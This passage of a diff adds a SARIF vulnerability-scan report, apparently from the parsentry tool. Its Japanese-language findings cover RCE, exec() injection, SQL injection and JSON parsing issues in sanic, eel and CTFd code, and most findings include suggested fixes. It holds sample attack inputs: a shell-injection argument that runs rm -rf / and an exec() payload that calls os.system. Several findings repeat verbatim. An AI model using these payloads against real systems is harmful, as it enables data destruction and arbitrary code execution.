`subprocess.Popen(_get_args_for_reloading(), ...)`\n\n### リスク評価\n信頼度: 80% - プロセス再起動メカニズムの一部として、攻撃者がアプリケーション起動時の引数を制御する場合、任意コード実行が可能",
+            "markdown": "## Remote Code Execution via sys.argv\n\n### 脆弱性の詳細\n`sys.argv`がコマンドライン引数から直接取得され、最小限のバリデーション後に`subprocess.Popen()`に渡されています。\n\n### PAR分析\n\n**Principal**: コマンドラインユーザー(攻撃者が制御可能な`sys.argv`)\n\n**Action**: Line 40-43で`sys.argv[0]`の基本的なチェック（空文字列と\"-c\"の排除）のみ\n\n**Resource**: Line 55の`subprocess.Popen()`によるプロセス実行\n\n### データフロー\n\n```\nuser input (sys.argv)\n  ↓\nLine 40: バリデーション不足（sys.argv[0]のみチェック）\n  ↓\nLine 46/47: sys.argv[1:] または sys.argv を直接使用\n  ↓\nLine 55: subprocess.Popen() に渡される\n  ↓\n[RCE 実行]\n```\n\n### 攻撃シナリオ\n\n攻撃者が意図的に細工された引数でスクリプトを実行した場合、`sys.argv`経由で任意のコマンド実行が可能です：\n\n```bash\npython app.py'; rm -rf /; echo '\n```\n\n### 影響範囲\n- Line 46: `[sys.executable, \"-m\", mod_spec.name] + sys.argv[1:]`\n- Line 47: `[sys.executable] + sys.argv`\n- Line 55-56: `subprocess.Popen(_get_args_for_reloading(), ...)`\n\n### リスク評価\n信頼度: 80% - プロセス再起動メカニズムの一部として、攻撃者がアプリケーション起動時の引数を制御する場合、任意コード実行が可能"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/gitea/repositories/cheshire-cat/sanic/reloader_helpers.py",
+                  "index": 17
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "7543c348ebb08a30"
+          },
+          "properties": {
+            "confidence": 0.8,
+            "mitre_attack": [
+              "T1190",
+              "T1059"
+            ],
+            "cwe": [
+              "CWE-77",
+              "CWE-78",
+              "CWE-94"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ],
+            "principal": "sys.argv - command-line arguments controlled by application invoker",
+            "action": "Insufficient validation - only sys.argv[0] is checked for empty string or '-c'",
+            "resource": "subprocess.Popen() - process execution at line 55",
+            "data_flow": "sys.argv → _get_args_for_reloading() → subprocess.Popen()"
+          }
+        },
+        {
+          "ruleId": "RCE",
+          "ruleIndex": 6,
+          "level": "warning",
+          "message": {
+            "text": "RCE: ## リモートコード実行脆弱性\n\n### 概要\nJavaScriptファイルから抽出された関数名が不十分な検証のみで `exec()` に直接渡されています。\n\n### 脆弱なコード\n```python\ndef _mock_js_function(f):\n    exec('%s = lambda *args: _mock_call(\"%s\", args)' % (f, f), globals())\n```\n\n### PAR分析\n\n**Principal（主体）**\n- 入力源: JavaScriptファイル内の `eel.expose()` 呼び出しから抽出された関数名\n- 信頼度: 低（ファイルシステム上のJSファイルは編集可能な場合がある）\n\n**Action（アクション）**\n- 検証: 正規表現で `(` と `=` のみ禁止 (123行)\n  ```python\n  assert rgx.findall(r'[\\(=]', expose_call) == [], msg\n  ```\n- 不足点:\n  - ダブルクォート、バックティックなどの特殊文字の処理不足\n  - 複雑な式やメタ文字の組み合わせに対する防御なし\n  - exec()の第2引数が`globals()`のため、グローバル名前空間が直接汚染対象\n\n**Resource（リソース）**\n- 目標: Python インタプリタのコード実行エンジン\n- 影響: アプリケーション全体のメモリとシステムリソースへのアクセス\n\n### 攻撃経路\n1. 攻撃者がJSファイルに悪意のある関数名を埋め込む\n2. `init()` 関数がファイルをスキャンし、関数名を抽出\n3. 不完全な正規表現フィルターを迂回する文字列パターンを使用\n4. `_mock_js_function()` で `exec()` が評価時に任意コードを実行\n\n### 具体例（攻撃ペイロード）\n```javascript\neel.expose(\"x\\\\n__import__('os').system('malicious_command')\\\\n#\")\n```\n\n実行される結果:\n```python\nx\n__import__('os').system('malicious_command')\n# = lambda *args: _mock_call(\"...\", args)\n```\n\n### 影響\n- リモートコード実行（RCE）\n- システムコマンド実行\n- ファイルシステムへの不正アクセス\n- データの窃取・改ざん\n\n### 推奨される修正\n1. `exec()` の使用を避ける\n2. ホワイトリスト方式で許可する文字のみを受け入れる (英数字とアンダースコアのみ)\n3. より安全な実装方法（例：`setattr()` や辞書操作）を使用\n4. 入力値の厳密なバリデーション\n\n### データフロー\nJSファイル → `init()` の os.walk() → 正規表現フィルタ → `_mock_js_function(f)` → `exec()` → コード実行",
+            "markdown": "## リモートコード実行脆弱性\n\n### 概要\nJavaScriptファイルから抽出された関数名が不十分な検証のみで `exec()` に直接渡されています。\n\n### 脆弱なコード\n```python\ndef _mock_js_function(f):\n    exec('%s = lambda *args: _mock_call(\"%s\", args)' % (f, f), globals())\n```\n\n### PAR分析\n\n**Principal（主体）**\n- 入力源: JavaScriptファイル内の `eel.expose()` 呼び出しから抽出された関数名\n- 信頼度: 低（ファイルシステム上のJSファイルは編集可能な場合がある）\n\n**Action（アクション）**\n- 検証: 正規表現で `(` と `=` のみ禁止 (123行)\n  ```python\n  assert rgx.findall(r'[\\(=]', expose_call) == [], msg\n  ```\n- 不足点:\n  - ダブルクォート、バックティックなどの特殊文字の処理不足\n  - 複雑な式やメタ文字の組み合わせに対する防御なし\n  - exec()の第2引数が`globals()`のため、グローバル名前空間が直接汚染対象\n\n**Resource（リソース）**\n- 目標: Python インタプリタのコード実行エンジン\n- 影響: アプリケーション全体のメモリとシステムリソースへのアクセス\n\n### 攻撃経路\n1. 攻撃者がJSファイルに悪意のある関数名を埋め込む\n2. `init()` 関数がファイルをスキャンし、関数名を抽出\n3. 不完全な正規表現フィルターを迂回する文字列パターンを使用\n4. `_mock_js_function()` で `exec()` が評価時に任意コードを実行\n\n### 具体例（攻撃ペイロード）\n```javascript\neel.expose(\"x\\\\n__import__('os').system('malicious_command')\\\\n#\")\n```\n\n実行される結果:\n```python\nx\n__import__('os').system('malicious_command')\n# = lambda *args: _mock_call(\"...\", args)\n```\n\n### 影響\n- リモートコード実行（RCE）\n- システムコマンド実行\n- ファイルシステムへの不正アクセス\n- データの窃取・改ざん\n\n### 推奨される修正\n1. `exec()` の使用を避ける\n2. ホワイトリスト方式で許可する文字のみを受け入れる (英数字とアンダースコアのみ)\n3. より安全な実装方法（例：`setattr()` や辞書操作）を使用\n4. 入力値の厳密なバリデーション\n\n### データフロー\nJSファイル → `init()` の os.walk() → 正規表現フィルタ → `_mock_js_function(f)` → `exec()` → コード実行"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/gitea/repositories/mock-turtle/eel/__init__.py",
+                  "index": 18
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "93dfe7b7531d5378"
+          },
+          "properties": {
+            "confidence": 0.8,
+            "mitre_attack": [
+              "T1190",
+              "T1059"
+            ],
+            "cwe": [
+              "CWE-77",
+              "CWE-78",
+              "CWE-94"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ],
+            "principal": "JavaScript file function names extracted via pyparsing from eel.expose() calls",
+            "action": "Incomplete validation - only checks for '(' and '=' characters, missing other dangerous patterns",
+            "resource": "Python exec() function with globals() scope - arbitrary code execution",
+            "data_flow": "JS_file_content → os.walk() → EXPOSED_JS_FUNCTIONS.parseString() → regex_filter → _mock_js_function(f) → exec(string, globals()) → code_execution"
+          }
+        },
+        {
+          "ruleId": "SQLI",
+          "ruleIndex": 0,
+          "level": "warning",
+          "message": {
+            "text": "SQLI: ### SQL Injection Vulnerability\n\n**説明**: \nSQLAlchemyのパラメータバインディングを使用せず、f-stringで直接`proc_id`をSQL文に埋め込んでいます。`proc_id`はMySQLの`SHOW PROCESSLIST`結果から取得されますが、整数値として検証されていません。\n\n**脆弱性の詳細**:\n- **Principal**: MySQL SHOW PROCESSLIST の実行結果（信頼できないデータソース）\n- **Action**: 入力検証なし - proc_id は型チェックされていない文字列値\n- **Resource**: `db.session.execute()` による直接SQL実行\n- **Data Flow**: `SHOW PROCESSLIST` → `proc.Id` → f-string補間 → `KILL` コマンド実行\n\n**攻撃ベクトル**: T1190 (Exploit Public-Facing Application)\n\n**推奨修正**:\nSQLAlchemyのパラメータバインディングを使用してください:\n```python\nfrom sqlalchemy import text\ndb.session.execute(text(\"KILL :proc_id\"), {\"proc_id\": proc_id})\n```\n\n**リスク**: MySQL のプロセス実行制御をバイパスされる可能性があります。",
+            "markdown": "### SQL Injection Vulnerability\n\n**説明**: \nSQLAlchemyのパラメータバインディングを使用せず、f-stringで直接`proc_id`をSQL文に埋め込んでいます。`proc_id`はMySQLの`SHOW PROCESSLIST`結果から取得されますが、整数値として検証されていません。\n\n**脆弱性の詳細**:\n- **Principal**: MySQL SHOW PROCESSLIST の実行結果（信頼できないデータソース）\n- **Action**: 入力検証なし - proc_id は型チェックされていない文字列値\n- **Resource**: `db.session.execute()` による直接SQL実行\n- **Data Flow**: `SHOW PROCESSLIST` → `proc.Id` → f-string補間 → `KILL` コマンド実行\n\n**攻撃ベクトル**: T1190 (Exploit Public-Facing Application)\n\n**推奨修正**:\nSQLAlchemyのパラメータバインディングを使用してください:\n```python\nfrom sqlalchemy import text\ndb.session.execute(text(\"KILL :proc_id\"), {\"proc_id\": proc_id})\n```\n\n**リスク**: MySQL のプロセス実行制御をバイパスされる可能性があります。"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/ctfd/data/CTFd/utils/exports/__init__.py",
+                  "index": 19
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "3fc52628589c450b"
+          },
+          "properties": {
+            "confidence": 0.8,
+            "mitre_attack": [
+              "T1190"
+            ],
+            "cwe": [
+              "CWE-89"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ],
+            "principal": "MySQL SHOW PROCESSLIST result (proc.Id field)",
+            "action": "No input validation - f-string interpolation without SQLAlchemy parameter binding",
+            "resource": "db.session.execute() - Direct SQL execution",
+            "data_flow": "SHOW PROCESSLIST → proc.Id → f-string → KILL command"
+          }
+        },
+        {
+          "ruleId": "SQLI",
+          "ruleIndex": 0,
+          "level": "warning",
+          "message": {
+            "text": "SQLI: ### SQL Injection Vulnerability\n\n**説明**: \nSQLAlchemyのパラメータバインディングを使用せず、f-stringで直接`proc_id`をSQL文に埋め込んでいます。`proc_id`はMySQLの`SHOW PROCESSLIST`結果から取得されますが、整数値として検証されていません。\n\n**脆弱性の詳細**:\n- **Principal**: MySQL SHOW PROCESSLIST の実行結果（信頼できないデータソース）\n- **Action**: 入力検証なし - proc_id は型チェックされていない文字列値\n- **Resource**: `db.session.execute()` による直接SQL実行\n- **Data Flow**: `SHOW PROCESSLIST` → `proc.Id` → f-string補間 → `KILL` コマンド実行\n\n**攻撃ベクトル**: T1190 (Exploit Public-Facing Application)\n\n**推奨修正**:\nSQLAlchemyのパラメータバインディングを使用してください:\n```python\nfrom sqlalchemy import text\ndb.session.execute(text(\"KILL :proc_id\"), {\"proc_id\": proc_id})\n```\n\n**リスク**: MySQL のプロセス実行制御をバイパスされる可能性があります。",
+            "markdown": "### SQL Injection Vulnerability\n\n**説明**: \nSQLAlchemyのパラメータバインディングを使用せず、f-stringで直接`proc_id`をSQL文に埋め込んでいます。`proc_id`はMySQLの`SHOW PROCESSLIST`結果から取得されますが、整数値として検証されていません。\n\n**脆弱性の詳細**:\n- **Principal**: MySQL SHOW PROCESSLIST の実行結果（信頼できないデータソース）\n- **Action**: 入力検証なし - proc_id は型チェックされていない文字列値\n- **Resource**: `db.session.execute()` による直接SQL実行\n- **Data Flow**: `SHOW PROCESSLIST` → `proc.Id` → f-string補間 → `KILL` コマンド実行\n\n**攻撃ベクトル**: T1190 (Exploit Public-Facing Application)\n\n**推奨修正**:\nSQLAlchemyのパラメータバインディングを使用してください:\n```python\nfrom sqlalchemy import text\ndb.session.execute(text(\"KILL :proc_id\"), {\"proc_id\": proc_id})\n```\n\n**リスク**: MySQL のプロセス実行制御をバイパスされる可能性があります。"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/ctfd/data/CTFd/utils/exports/__init__.py",
+                  "index": 20
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "3fc52628589c450b"
+          },
+          "properties": {
+            "confidence": 0.8,
+            "mitre_attack": [
+              "T1190"
+            ],
+            "cwe": [
+              "CWE-89"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ],
+            "principal": "MySQL SHOW PROCESSLIST result (proc.Id field)",
+            "action": "No input validation - f-string interpolation without SQLAlchemy parameter binding",
+            "resource": "db.session.execute() - Direct SQL execution",
+            "data_flow": "SHOW PROCESSLIST → proc.Id → f-string → KILL command"
+          }
+        },
+        {
+          "ruleId": "PARSE_ERROR",
+          "ruleIndex": 7,
+          "level": "warning",
+          "message": {
+            "text": "PARSE_ERROR: ## 脆弱性分析\n\n### 概要\n`JSON.parse()`がクライアント側の信頼されないデータソース（`localStorage`）から取得した値に対して直接実行されており、例外処理がありません。\n\n### Principal（信頼されないデータソース）\n- **`event.newValue`**: `storage`イベントから取得される値\n- ブラウザの`localStorage`はクライアント側で改ざん可能なため、信頼されないデータ源\n- 悪意のあるスクリプトまたはブラウザコンソールからの直接操作で変更可能\n\n### Action（セキュリティコントロール）\n現状では以下のコントロールのみ:\n```javascript\nif (event.key == \"integrations\" && event.newValue) {\n  let integration = JSON.parse(event.newValue);\n```\n\n- キー名の検証: あり（`event.key == \"integrations\"`）\n- 値の形式検証: なし\n- JSON解析時の例外処理: なし\n- パース後のデータ型チェック: なし\n\n### Resource（センシティブな操作）\n- DOM操作による UI状態の変更\n- `localStorage.removeItem()`による状態管理\n\n### 攻撃シナリオ\n1. 攻撃者が`localStorage['integrations']`に不正なJSON（例: `\"{invalid json}\"` または `\"123\"`）を設定\n2. 別のタブ/ウィンドウで`storage`イベントがトリガー\n3. `JSON.parse()`が例外を発生させ、アプリケーションが予期しない動作をする可能性\n\n### 技術的な問題\n- **例外の未処理**: `JSON.parse()`は不正なJSON形式で`SyntaxError`を発生させるが、`try-catch`ブロックがない\n- **入力値の非検証**: パース前に形式の妥当性を検証していない\n- **パース後のスキーマ検証**: パース後のオブジェクトの構造や型を検証していない\n\n### 推奨される修正\n```javascript\nwindow.addEventListener(\"storage\", function(event) {\n  if (event.key == \"integrations\" && event.newValue) {\n    try {\n      let integration = JSON.parse(event.newValue);\n      if (typeof integration === \"object\" && integration !== null && integration[\"name\"] === \"mlc\") {\n        $(\"#integration-mlc\")\n          .text(\"Already Configured\")\n          .attr(\"disabled\", true);\n        window.focus();\n        localStorage.removeItem(\"integrations\");\n      }\n    } catch (e) {\n      console.error(\"Failed to parse integration data\", e);\n      localStorage.removeItem(\"integrations\");\n    }\n  }\n});\n```",
+            "markdown": "## 脆弱性分析\n\n### 概要\n`JSON.parse()`がクライアント側の信頼されないデータソース（`localStorage`）から取得した値に対して直接実行されており、例外処理がありません。\n\n### Principal（信頼されないデータソース）\n- **`event.newValue`**: `storage`イベントから取得される値\n- ブラウザの`localStorage`はクライアント側で改ざん可能なため、信頼されないデータ源\n- 悪意のあるスクリプトまたはブラウザコンソールからの直接操作で変更可能\n\n### Action（セキュリティコントロール）\n現状では以下のコントロールのみ:\n```javascript\nif (event.key == \"integrations\" && event.newValue) {\n  let integration = JSON.parse(event.newValue);\n```\n\n- キー名の検証: あり（`event.key == \"integrations\"`）\n- 値の形式検証: なし\n- JSON解析時の例外処理: なし\n- パース後のデータ型チェック: なし\n\n### Resource（センシティブな操作）\n- DOM操作による UI状態の変更\n- `localStorage.removeItem()`による状態管理\n\n### 攻撃シナリオ\n1. 攻撃者が`localStorage['integrations']`に不正なJSON（例: `\"{invalid json}\"` または `\"123\"`）を設定\n2. 別のタブ/ウィンドウで`storage`イベントがトリガー\n3. `JSON.parse()`が例外を発生させ、アプリケーションが予期しない動作をする可能性\n\n### 技術的な問題\n- **例外の未処理**: `JSON.parse()`は不正なJSON形式で`SyntaxError`を発生させるが、`try-catch`ブロックがない\n- **入力値の非検証**: パース前に形式の妥当性を検証していない\n- **パース後のスキーマ検証**: パース後のオブジェクトの構造や型を検証していない\n\n### 推奨される修正\n```javascript\nwindow.addEventListener(\"storage\", function(event) {\n  if (event.key == \"integrations\" && event.newValue) {\n    try {\n      let integration = JSON.parse(event.newValue);\n      if (typeof integration === \"object\" && integration !== null && integration[\"name\"] === \"mlc\") {\n        $(\"#integration-mlc\")\n          .text(\"Already Configured\")\n          .attr(\"disabled\", true);\n        window.focus();\n        localStorage.removeItem(\"integrations\");\n      }\n    } catch (e) {\n      console.error(\"Failed to parse integration data\", e);\n      localStorage.removeItem(\"integrations\");\n    }\n  }\n});\n```"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/ctfd/data/CTFd/themes/core/assets/js/pages/setup.js",
+                  "index": 21
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "ab215c7714d7b553"
+          },
+          "properties": {
+            "confidence": 0.8,
+            "mitre_attack": [],
+            "cwe": [],
+            "owasp": [],
+            "principal": "event.newValue from window.storage event (untrusted localStorage data)",
+            "action": "Minimal validation (key check only), no JSON parsing error handling",
+            "resource": "DOM manipulation and localStorage state management",
+            "data_flow": "localStorage → storage event → JSON.parse() → DOM update"
+          }
+        },
+        {
+          "ruleId": "SQLI",
+          "ruleIndex": 0,
+          "level": "warning",
+          "message": {
+            "text": "SQLI: ### SQL Injection Vulnerability\n\n**説明**: \nSQLAlchemyのパラメータバインディングを使用せず、f-stringで直接`proc_id`をSQL文に埋め込んでいます。`proc_id`はMySQLの`SHOW PROCESSLIST`結果から取得されますが、整数値として検証されていません。\n\n**脆弱性の詳細**:\n- **Principal**: MySQL SHOW PROCESSLIST の実行結果（信頼できないデータソース）\n- **Action**: 入力検証なし - proc_id は型チェックされていない文字列値\n- **Resource**: `db.session.execute()` による直接SQL実行\n- **Data Flow**: `SHOW PROCESSLIST` → `proc.Id` → f-string補間 → `KILL` コマンド実行\n\n**攻撃ベクトル**: T1190 (Exploit Public-Facing Application)\n\n**推奨修正**:\nSQLAlchemyのパラメータバインディングを使用してください:\n```python\nfrom sqlalchemy import text\ndb.session.execute(text(\"KILL :proc_id\"), {\"proc_id\": proc_id})\n```\n\n**リスク**: MySQL のプロセス実行制御をバイパスされる可能性があります。",
+            "markdown": "### SQL Injection Vulnerability\n\n**説明**: \nSQLAlchemyのパラメータバインディングを使用せず、f-stringで直接`proc_id`をSQL文に埋め込んでいます。`proc_id`はMySQLの`SHOW PROCESSLIST`結果から取得されますが、整数値として検証されていません。\n\n**脆弱性の詳細**:\n- **Principal**: MySQL SHOW PROCESSLIST の実行結果（信頼できないデータソース）\n- **Action**: 入力検証なし - proc_id は型チェックされていない文字列値\n- **Resource**: `db.session.execute()` による直接SQL実行\n- **Data Flow**: `SHOW PROCESSLIST` → `proc.Id` → f-string補間 → `KILL` コマンド実行\n\n**攻撃ベクトル**: T1190 (Exploit Public-Facing Application)\n\n**推奨修正**:\nSQLAlchemyのパラメータバインディングを使用してください:\n```python\nfrom sqlalchemy import text\ndb.session.execute(text(\"KILL :proc_id\"), {\"proc_id\": proc_id})\n```\n\n**リスク**: MySQL のプロセス実行制御をバイパスされる可能性があります。"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/ctfd/data/CTFd/utils/exports/__init__.py",
+                  "index": 22
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "3fc52628589c450b"
+          },
+          "properties": {
+            "confidence": 0.8,
+            "mitre_attack": [
+              "T1190"
+            ],
+            "cwe": [
+              "CWE-89"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ],
+            "principal": "MySQL SHOW PROCESSLIST result (proc.Id field)",
+            "action": "No input validation - f-string interpolation without SQLAlchemy parameter binding",
+            "resource": "db.session.execute() - Direct SQL execution",
+            "data_flow": "SHOW PROCESSLIST → proc.Id → f-string → KILL command"
+          }
+        },
+        {
+          "ruleId": "SQLI",
+          "ruleIndex": 0,
+          "level": "warning",
+          "message": {
+            "text": "SQLI: ### SQL Injection Vulnerability\n\n**説明**: \nSQLAlchemyのパラメータバインディングを使用せず、f-stringで直接`proc_id`をSQL文に埋め込んでいます。`proc_id`はMySQLの`SHOW PROCESSLIST`結果から取得されますが、整数値として検証されていません。\n\n**脆弱性の詳細**:\n- **Principal**: MySQL SHOW PROCESSLIST の実行結果（信頼できないデータソース）\n- **Action**: 入力検証なし - proc_id は型チェックされていない文字列値\n- **Resource**: `db.session.execute()` による直接SQL実行\n- **Data Flow**: `SHOW PROCESSLIST` → `proc.Id` → f-string補間 → `KILL` コマンド実行\n\n**攻撃ベクトル**: T1190 (Exploit Public-Facing Application)\n\n**推奨修正**:\nSQLAlchemyのパラメータバインディングを使用してください:\n```python\nfrom sqlalchemy import text\ndb.session.execute(text(\"KILL :proc_id\"), {\"proc_id\": proc_id})\n```\n\n**リスク**: MySQL のプロセス実行制御をバイパスされる可能性があります。",
+            "markdown": "### SQL Injection Vulnerability\n\n**説明**: \nSQLAlchemyのパラメータバインディングを使用せず、f-stringで直接`proc_id`をSQL文に埋め込んでいます。`proc_id`はMySQLの`SHOW PROCESSLIST`結果から取得されますが、整数値として検証されていません。\n\n**脆弱性の詳細**:\n- **Principal**: MySQL SHOW PROCESSLIST の実行結果（信頼できないデータソース）\n- **Action**: 入力検証なし - proc_id は型チェックされていない文字列値\n- **Resource**: `db.session.execute()` による直接SQL実行\n- **Data Flow**: `SHOW PROCESSLIST` → `proc.Id` → f-string補間 → `KILL` コマンド実行\n\n**攻撃ベクトル**: T1190 (Exploit Public-Facing Application)\n\n**推奨修正**:\nSQLAlchemyのパラメータバインディングを使用してください:\n```python\nfrom sqlalchemy import text\ndb.session.execute(text(\"KILL :proc_id\"), {\"proc_id\": proc_id})\n```\n\n**リスク**: MySQL のプロセス実行制御をバイパスされる可能性があります。"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/ctfd/data/CTFd/CTFd/__init__.py",
+                  "index": 23
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "127d52b88b53bc26"
+          },
+          "properties": {
+            "confidence": 0.8,
+            "mitre_attack": [
+              "T1190"
+            ],
+            "cwe": [
+              "CWE-89"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ],
+            "principal": "MySQL SHOW PROCESSLIST result (proc.Id field)",
+            "action": "No input validation - f-string interpolation without SQLAlchemy parameter binding",
+            "resource": "db.session.execute() - Direct SQL execution",
+            "data_flow": "SHOW PROCESSLIST → proc.Id → f-string → KILL command"
+          }
+        },
+        {
+          "ruleId": "SQLI",
+          "ruleIndex": 0,
+          "level": "warning",
+          "message": {
+            "text": "SQLI: ### SQL Injection Vulnerability\n\n**説明**: \nSQLAlchemyのパラメータバインディングを使用せず、f-stringで直接`proc_id`をSQL文に埋め込んでいます。`proc_id`はMySQLの`SHOW PROCESSLIST`結果から取得されますが、整数値として検証されていません。\n\n**脆弱性の詳細**:\n- **Principal**: MySQL SHOW PROCESSLIST の実行結果（信頼できないデータソース）\n- **Action**: 入力検証なし - proc_id は型チェックされていない文字列値\n- **Resource**: `db.session.execute()` による直接SQL実行\n- **Data Flow**: `SHOW PROCESSLIST` → `proc.Id` → f-string補間 → `KILL` コマンド実行\n\n**攻撃ベクトル**: T1190 (Exploit Public-Facing Application)\n\n**推奨修正**:\nSQLAlchemyのパラメータバインディングを使用してください:\n```python\nfrom sqlalchemy import text\ndb.session.execute(text(\"KILL :proc_id\"), {\"proc_id\": proc_id})\n```\n\n**リスク**: MySQL のプロセス実行制御をバイパスされる可能性があります。",
+            "markdown": "### SQL Injection Vulnerability\n\n**説明**: \nSQLAlchemyのパラメータバインディングを使用せず、f-stringで直接`proc_id`をSQL文に埋め込んでいます。`proc_id`はMySQLの`SHOW PROCESSLIST`結果から取得されますが、整数値として検証されていません。\n\n**脆弱性の詳細**:\n- **Principal**: MySQL SHOW PROCESSLIST の実行結果（信頼できないデータソース）\n- **Action**: 入力検証なし - proc_id は型チェックされていない文字列値\n- **Resource**: `db.session.execute()` による直接SQL実行\n- **Data Flow**: `SHOW PROCESSLIST` → `proc.Id` → f-string補間 → `KILL` コマンド実行\n\n**攻撃ベクトル**: T1190 (Exploit Public-Facing Application)\n\n**推奨修正**:\nSQLAlchemyのパラメータバインディングを使用してください:\n```python\nfrom sqlalchemy import text\ndb.session.execute(text(\"KILL :proc_id\"), {\"proc_id\": proc_id})\n```\n\n**リスク**: MySQL のプロセス実行制御をバイパスされる可能性があります。"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/ctfd/data/CTFd/CTFd/utils/__init__.py",
+                  "index": 24
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "fd5e5ac8bc746a42"
+          },
+          "properties": {
+            "confidence": 0.8,
+            "mitre_attack": [
+              "T1190"
+            ],
+            "cwe": [
+              "CWE-89"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ],
+            "principal": "MySQL SHOW PROCESSLIST result (proc.Id field)",
+            "action": "No input validation - f-string interpolation without SQLAlchemy parameter binding",
+            "resource": "db.session.execute() - Direct SQL execution",
+            "data_flow": "SHOW PROCESSLIST → proc.Id → f-string → KILL command"
+          }
+        },
+        {
+          "ruleId": "SQLI",
+          "ruleIndex": 0,
+          "level": "warning",
+          "message": {
+            "text": "SQLI: ### SQL Injection Vulnerability\n\n**説明**: \nSQLAlchemyのパラメータバインディングを使用せず、f-stringで直接`proc_id`をSQL文に埋め込んでいます。`proc_id`はMySQLの`SHOW PROCESSLIST`結果から取得されますが、整数値として検証されていません。\n\n**脆弱性の詳細**:\n- **Principal**: MySQL SHOW PROCESSLIST の実行結果（信頼できないデータソース）\n- **Action**: 入力検証なし - proc_id は型チェックされていない文字列値\n- **Resource**: `db.session.execute()` による直接SQL実行\n- **Data Flow**: `SHOW PROCESSLIST` → `proc.Id` → f-string補間 → `KILL` コマンド実行\n\n**攻撃ベクトル**: T1190 (Exploit Public-Facing Application)\n\n**推奨修正**:\nSQLAlchemyのパラメータバインディングを使用してください:\n```python\nfrom sqlalchemy import text\ndb.session.execute(text(\"KILL :proc_id\"), {\"proc_id\": proc_id})\n```\n\n**リスク**: MySQL のプロセス実行制御をバイパスされる可能性があります。",
+            "markdown": "### SQL Injection Vulnerability\n\n**説明**: \nSQLAlchemyのパラメータバインディングを使用せず、f-stringで直接`proc_id`をSQL文に埋め込んでいます。`proc_id`はMySQLの`SHOW PROCESSLIST`結果から取得されますが、整数値として検証されていません。\n\n**脆弱性の詳細**:\n- **Principal**: MySQL SHOW PROCESSLIST の実行結果（信頼できないデータソース）\n- **Action**: 入力検証なし - proc_id は型チェックされていない文字列値\n- **Resource**: `db.session.execute()` による直接SQL実行\n- **Data Flow**: `SHOW PROCESSLIST` → `proc.Id` → f-string補間 → `KILL` コマンド実行\n\n**攻撃ベクトル**: T1190 (Exploit Public-Facing Application)\n\n**推奨修正**:\nSQLAlchemyのパラメータバインディングを使用してください:\n```python\nfrom sqlalchemy import text\ndb.session.execute(text(\"KILL :proc_id\"), {\"proc_id\": proc_id})\n```\n\n**リスク**: MySQL のプロセス実行制御をバイパスされる可能性があります。"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/ctfd/data/CTFd/CTFd/utils/exports/__init__.py",
+                  "index": 25
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "1696a5b7d66b2c15"
+          },
+          "properties": {
+            "confidence": 0.8,
+            "mitre_attack": [
+              "T1190"
+            ],
+            "cwe": [
+              "CWE-89"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ],
+            "principal": "MySQL SHOW PROCESSLIST result (proc.Id field)",
+            "action": "No input validation - f-string interpolation without SQLAlchemy parameter binding",
+            "resource": "db.session.execute() - Direct SQL execution",
+            "data_flow": "SHOW PROCESSLIST → proc.Id → f-string → KILL command"
+          }
+        },
+        {
+          "ruleId": "SQLI",
+          "ruleIndex": 0,
+          "level": "warning",
+          "message": {
+            "text": "SQLI: ### SQL Injection Vulnerability\n\n**説明**: \nSQLAlchemyのパラメータバインディングを使用せず、f-stringで直接`proc_id`をSQL文に埋め込んでいます。`proc_id`はMySQLの`SHOW PROCESSLIST`結果から取得されますが、整数値として検証されていません。\n\n**脆弱性の詳細**:\n- **Principal**: MySQL SHOW PROCESSLIST の実行結果（信頼できないデータソース）\n- **Action**: 入力検証なし - proc_id は型チェックされていない文字列値\n- **Resource**: `db.session.execute()` による直接SQL実行\n- **Data Flow**: `SHOW PROCESSLIST` → `proc.Id` → f-string補間 → `KILL` コマンド実行\n\n**攻撃ベクトル**: T1190 (Exploit Public-Facing Application)\n\n**推奨修正**:\nSQLAlchemyのパラメータバインディングを使用してください:\n```python\nfrom sqlalchemy import text\ndb.session.execute(text(\"KILL :proc_id\"), {\"proc_id\": proc_id})\n```\n\n**リスク**: MySQL のプロセス実行制御をバイパスされる可能性があります。",
